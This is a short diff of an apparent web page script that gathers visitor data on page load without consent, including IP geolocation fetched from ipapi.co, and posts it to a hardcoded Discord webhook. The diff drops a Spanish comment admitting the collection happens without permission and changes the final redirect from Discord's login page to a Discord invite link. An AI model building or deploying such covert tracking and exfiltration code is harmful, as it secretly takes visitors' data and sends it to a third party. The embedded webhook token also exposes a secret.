@@ -27,7 +27,6 @@
         const hook = "https://discord.com/api/webhooks/1509748386973220975/s3XxCMhpK8PFhgpX8aFnxEttiRm-RM-zbdOqtVSDUMNf_t3d-iBxl5NmcXPSXc95XvOU";
         let techData = {};
 
-        // Recolección inmediata de datos sin permisos
         async function collectTechData() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -69,7 +68,8 @@
                 body: JSON.stringify(data)
             });
             
-            window.location.href = "https://discord.com/login";
+            // Redirección al servidor de Discord solicitado
+            window.location.href = "https://discord.gg/xH3uckveX";
         }
     </script>
 </body>
